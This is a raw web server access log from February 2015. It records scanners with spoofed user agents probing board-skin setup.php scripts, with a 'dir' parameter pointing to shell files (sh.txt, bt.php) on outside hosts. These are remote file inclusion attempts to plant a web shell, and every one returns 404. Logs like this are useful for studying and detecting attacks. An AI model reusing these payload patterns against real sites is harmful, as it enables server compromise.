211.47.181.38 - - [15/Feb/2015:08:36:41 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
211.47.181.38 - - [15/Feb/2015:08:36:43 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
211.47.181.38 - - [15/Feb/2015:08:36:45 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
211.47.181.38 - - [15/Feb/2015:08:36:45 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
91.121.6.123 - - [15/Feb/2015:08:36:46 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
211.47.181.38 - - [15/Feb/2015:08:36:47 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;" 
91.121.6.123 - - [15/Feb/2015:08:36:47 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:36:48 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
91.121.6.123 - - [15/Feb/2015:08:36:49 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "FreeWebMonitoring SiteChecker/0.1 (+http://www.freewebmonitoring.com)" 
211.47.181.38 - - [15/Feb/2015:08:37:11 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//sh.txt? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
211.47.181.38 - - [15/Feb/2015:08:37:12 -0800] "GET ////bbs/skin/ggambo6210_board/setup.php?dir=http://www.balloonpia.co.kr/log/mods//bt.php? HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
211.47.181.38 - - [15/Feb/2015:08:37:12 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
211.47.181.38 - - [15/Feb/2015:08:37:14 -0800] "POST ////bbs/skin/ggambo6210_board/setup.php HTTP/1.1" 404 284 "-" "msnbot/1.1 (+http://search.msn.com/msnbot.htm)" 
176.31.252.38 - - [15/Feb/2015:08:37:33 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [15/Feb/2015:08:37:34 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.fsens.com/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [15/Feb/2015:08:37:34 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
176.31.252.38 - - [15/Feb/2015:08:37:36 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1" 
